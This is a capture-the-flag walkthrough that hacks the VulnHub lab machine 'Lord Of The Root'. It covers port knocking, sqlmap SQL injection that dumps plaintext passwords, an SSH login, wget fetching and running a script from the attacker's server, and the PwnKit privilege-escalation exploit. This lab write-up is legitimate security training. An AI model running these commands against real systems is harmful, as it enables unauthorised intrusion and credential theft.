# CTF #2 - Lord Of The Root
As a LOTR fan I decided to start my CTF documentations by documenting the process of hacking this VulnHub Machine called **Lord Of The Root.** 

But first, let's have a look to my setup:
## My Setup
- A VirtualBox VM running **Kali Linux.** 
- Another VM running **LOTRoot.** You can download the .OVA file **[**here.**](https://www.vulnhub.com/entry/lord-of-the-root-101,129/)**
- A **local network** for both machines. If you want to know how to set up a local network for your VirtualBox adventures, follow [**this simple tutorial.**](https://github.com/amtzespinosa/secure-network-for-ctf)
- Coffee. You always need coffee for hacking.
- And today, to season this CTF session... Let's play [**Sodom -  M-16.**](https://www.youtube.com/watch?v=T3_v7wPNj9w&ab_channel=ThrashtilDeath4K%28Fullalbums&lyrics%29)

Now you are all set up and ready to go!

## Recon

I always like to run a fast/aggressive scan over the network with **Nmap.** To do so, I use this command:

    sudo nmap -sV -T4 192.168.1.1/24

*192.168.1.1/24 is my local network --- yours might be different. Check it with the command* `ip a`.

After getting the victim's IP, I like to run another scan. This time a more **thorough and focused scan** with the command:

    sudo nmap -p- -T4 -A -O -v 192.168.1.28

This way, we get more information about the victim. Let's have a look:

    Nmap scan report for 192.168.1.28
    Host is up (0.00036s latency).
    Not shown: 65534 filtered tcp ports (no-response)
    
    PORT   STATE SERVICE VERSION
    
    22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.3 (Ubuntu Linux; protocol 2.0)
    | ssh-hostkey: 
    |   1024 3c3de38e35f9da7420efaa494a1deddd (DSA)
    |   2048 85946c87c9a8350f2cdbbbc13f2a50c1 (RSA)
    |   256 f3cdaa1d05f21e8c618725b6f4344537 (ECDSA)
    |_  256 34ec16dda7cf2a8645ec65ea05438921 (ED25519)
    
    MAC Address: 08:00:27:49:9F:AC (Oracle VirtualBox virtual NIC)
    Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
    Device type: general purpose
    Running: Linux 3.X|4.X
    OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
    OS details: Linux 3.10 - 4.11, Linux 3.16 - 4.6, Linux 3.2 - 4.9, Linux 4.4
    Uptime guess: 198.841 days (since Sun Sep 18 00:54:56 2022)
    Network Distance: 1 hop
    TCP Sequence Prediction: Difficulty=262 (Good luck!)
    IP ID Sequence Generation: All zeros
    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Ok, now we know that only port 22 is open. So let's try to connect via **ssh** with the victim's machine:

   

    ssh 192.168.1.28 -p 22

And we already get some hints... 

**LOTR**
**Knock Friend To Enter**
*Easy as 1, 2, 3*

Hmm... I admit it, I tried to login with some of the words that Gandalf said in the movie. No result. Then I realized: 1,2,3... Might be ports? Let's knock some ports!

    sudo nmap -Pn --host-timeout 50 --max-retries 0 -p 1 192.168.1.28

    sudo nmap -Pn --host-timeout 50 --max-retries 0 -p 2 192.168.1.28

    sudo nmap -Pn --host-timeout 50 --max-retries 0 -p 3 192.168.1.28

The 3 outputs together (scans must be run individually for each port):

    Nmap scan report for 192.168.1.28
    Host is up (0.00041s latency).
    
    PORT  STATE    SERVICE
    1/tcp filtered tcpmux
    2/tcp filtered compressnet
    3/tcp filtered compressnet
    MAC Address: 08:00:27:49:9F:AC (Oracle VirtualBox virtual NIC)

Of course, the output says that those ports are filtered. But let's run again the thorough scan we did at the beginning to check if we have triggered something...

    Nmap scan report for 192.168.1.28
    Host is up (0.00032s latency).
    Not shown: 65533 filtered tcp ports (no-response)
    
    PORT     STATE SERVICE VERSION
    
    22/tcp   open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.3 (Ubuntu Linux; protocol 2.0)
    | ssh-hostkey: 
    |   1024 3c3de38e35f9da7420efaa494a1deddd (DSA)
    |   2048 85946c87c9a8350f2cdbbbc13f2a50c1 (RSA)
    |   256 f3cdaa1d05f21e8c618725b6f4344537 (ECDSA)
    |_  256 34ec16dda7cf2a8645ec65ea05438921 (ED25519)
    
    1337/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
    |_http-title: Site doesn't have a title (text/html).
    | http-methods: 
    |_  Supported Methods: GET HEAD POST OPTIONS
    |_http-server-header: Apache/2.4.7 (Ubuntu)
    
    MAC Address: 08:00:27:49:9F:AC (Oracle VirtualBox virtual NIC)
    Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
    Device type: general purpose
    Running: Linux 3.X|4.X
    OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
    OS details: Linux 3.10 - 4.11, Linux 3.16 - 4.6, Linux 3.2 - 4.9
    Uptime guess: 0.020 days (since Tue Apr  4 21:05:58 2023)
    Network Distance: 1 hop
    TCP Sequence Prediction: Difficulty=256 (Good luck!)
    IP ID Sequence Generation: All zeros
    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

AND BOOM! New port appears! Now we have the ***port 1337*** open and it's ***http***. Let's head to Firefox and search:

    http://192.168.1.28:1337/

## Enumeration

Okey, lets run a **Nikto** scan:

    sudo nikto -h http://192.168.1.28:1337/ -C all

And let's have a look to the output:

    - Nikto v2.5.0
    ---------------------------------------------------------------------------
    + Target IP:          192.168.1.28
    + Target Hostname:    192.168.1.28
    + Target Port:        1337
    + Start Time:         2023-04-04 21:39:42 (GMT2)
    ---------------------------------------------------------------------------
    + Server: Apache/2.4.7 (Ubuntu)
    + /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
    + /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
    + /images: IP address found in the 'location' header. The IP is "127.0.1.1". See: https://portswigger.net/kb/issues/00600300_private-ip-addresses-disclosed
    + /images: The web server may reveal its internal or real IP in the Location header via a request to with HTTP/1.0. The value is "127.0.1.1". See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2000-0649
    + Apache/2.4.7 appears to be outdated (current is at least Apache/2.4.54). Apache 2.2.34 is the EOL for the 2.x branch.
    + OPTIONS: Allowed HTTP Methods: GET, HEAD, POST, OPTIONS .
    + /images/: Directory indexing found.
    + /icons/README: Apache default file found. See: https://www.vntweb.co.uk/apache-restricting-access-to-iconsreadme/
    + /#wp-config.php#: #wp-config.php# file found. This file contains the credentials.
    + 26640 requests: 0 error(s) and 9 item(s) reported on remote host
    + End Time:           2023-04-04 21:40:39 (GMT2) (57 seconds)
    ---------------------------------------------------------------------------

OK, let's search for that /config.php file... 

    http://192.168.1.28:1337/config.php

And we have another page!

> Note: I realized after all of this that typing whatever in the URL,
> you get that page. But it is good practice just to not go typing
> `/mordor` everywhere...

If we take a look to the page source, we find something very, VERY interesting:

    THprM09ETTBOVEl4TUM5cGJtUmxlQzV3YUhBPSBDbG9zZXIh

From my experience, it looks like a **base64** hash. So let's open **[**CyberChef**](https://gchq.github.io/CyberChef/)** (put this website in your bookmarks. Really. You'll use it a lot during CTFs).

Once we decrypt it, we get another **base64** hash and a hint:

    Lzk3ODM0NTIxMC9pbmRleC5waHA= Closer!

So let's decrypt the decrypted hash:

    /978345210/index.php

Looks like we have a URL! Now we are talking business...

## Exploitation

We are now facing some kind of login page. And tha means... **DATABASES!** Let's try some **SQLi with SQLMAP.**

    sudo sqlmap -u http://192.168.1.28:1337/978345210/index.php/ --dump all --forms

And after the magic happens... We have a DB dump: **Webapp**.

    Database: Webapp
    Table: Users
    [5 entries]
    +----+------------------+----------+
    | id | password         | username |
    +----+------------------+----------+
    | 1  | iwilltakethering | frodo    |
    | 2  | MyPreciousR00t   | smeagol  |
    | 3  | AndMySword       | aragorn  |
    | 4  | AndMyBow         | legolas  |
    | 5  | AndMyAxe         | gimli    |
    +----+------------------+----------+

**USER:** smeagol
**PASS:** MyPreciousR00t

Let's login with these credentials...

    ssh smeagol@192.168.1.28 -p 22

And yes! We have a terminal. Now it's just a matter os **Privilege Escalation.** 

First, let's do some inside recon and enumeration.

> Note: You can find all the scripts and tools I am using in the files
> sections.

OK, let's start by getting some useful tools from our machine. **In your Kali machine:**

 1. Open a terminal and start Apache with `sudo service apache2 start`.
 2. Head to `/var/www/html`.
 3. Download the following script: `len.sh`. This script will tell us possible ways to exploit the machine.
 4. Once you have it, paste it in the `/var/www/html` folder.
 
 **In the victim's machine:**

 3. `pwd` command to make sure you are at `/home/smeagol` directory
 4. Now, let's download some stuff. Use  ` wget http://192.168.1.23/les.sh` command to download the script.
 5. Give mod permissions with `chmod +x les.sh`
 6. Run it with `./les.sh`

Now we know this machine is vulnerable to many exploits but we will focus in one: 

    [+] [CVE-2021-4034] PwnKit
    
       Details: https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt
       Exposure: probable
       Tags: [ ubuntu=10|11|12|13|14|15|16|17|18|19|20|21 ],debian=7|8|9|10|11,fedora,manjaro
       Download URL: https://codeload.github.com/berdav/CVE-2021-4034/zip/main

Download the exploit file and let's keep going. 

Now you have to copy the `PwnKit.c` file into the `/var/www/html` folder to download it from the victim machine with `wget` command as before. Once you have it, justgive mod permissions:

    chmod 777 PwnKit.c

Compile it:

    gcc -shared PwnKit.c -o PwnKit -Wl,-e,entry -fPIC
 
Give permissions to the exec file:

    chmod 777 PwnKit

And... EXPLOIT!

    ./PwnKit

Check you are now root with the command:

    id

And you should get back:

    uid=0(root) gid=0(root) groups=0(root),1000(smeagol)

There you go, now we are root! And if we head to the `root`directory, we can find a `Flag.txt`. That is the proof we got root access. 

Check my next adventure: [CTF #3 - Tr0ll](https://github.com/amtzespinosa/tr0ll-walkthrough)
